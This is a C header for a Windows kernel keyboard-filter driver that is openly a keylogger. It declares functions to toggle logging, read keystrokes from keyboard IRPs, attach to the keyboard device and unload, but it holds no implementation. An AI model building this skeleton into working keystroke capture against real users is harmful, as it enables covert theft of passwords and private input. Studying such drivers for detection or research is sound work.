// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief      Enables the keylogger by setting the flag.
**/
VOID
TechniquesKeyboardFilter_KeyloggerOn();



/**
	@brief      Disables the keylogger by clearing the flag.
**/
VOID
TechniquesKeyboardFilter_KeyloggerOff();



/**
	@brief      Function to read keystrokes from keyboard device.


	@see        PDEVICE_OBJECT          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
	@param[in]  pDeviceObject           Pointer to a DEVICE_OBJECT structure representing the device.

	@see        PIRP                    https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
	@param[in]  pIrp                    Pointer to the I/O request packet (IRP) for reading keystrokes.


	@return     A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
TechniquesKeyboardFilter_KeyloggerReadKeystrokes(
	_In_        PDEVICE_OBJECT          pDeviceObject,
	_In_        PIRP                    pIrp
);



/**
	@brief      Attaches the keyboard device to the driver.


	@see        PDEVICE_OBJECT          https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
	@param[in]  pDriverObject           Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.


	@return     A NTSTATUS value indicating success or an error code if operation fails.
**/
NTSTATUS
TechniquesKeyboardFilter_KeyloggerAttachKeyboard(
	_In_        PDRIVER_OBJECT          pDriverObject
);



/**
	@brief      Cleans up and detaches the keyboard keylogger driver.
**/
VOID
TechniquesKeyboardFilter_Unload();



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
